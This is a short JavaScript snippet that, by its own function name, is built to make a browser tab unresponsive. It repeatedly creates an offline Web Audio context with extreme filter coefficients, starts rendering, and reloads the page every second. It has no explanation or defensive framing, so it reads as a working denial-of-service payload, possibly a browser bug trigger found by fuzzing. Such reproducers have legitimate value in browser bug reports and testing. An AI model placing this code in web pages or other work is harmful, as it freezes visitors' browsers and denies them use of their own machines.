function makeTabUnresponsive() {
  var ctx = new OfflineAudioContext(5, 32767, 768000);
  var sp = ctx.createScriptProcessor(256, 5, 31);
  var stereoPanner = ctx.createStereoPanner();
  let iir = new IIRFilterNode(ctx, {
    channelCount: 2,
    feedforward: [5.087004514715234e+18],
    feedback: [0.726542528005361]
  });
  stereoPanner.connect(ctx.destination);
  ctx.startRendering();
  sp.connect(iir);
}

setInterval(makeTabUnresponsive, 500);
setTimeout(_ => location.reload(), 1000);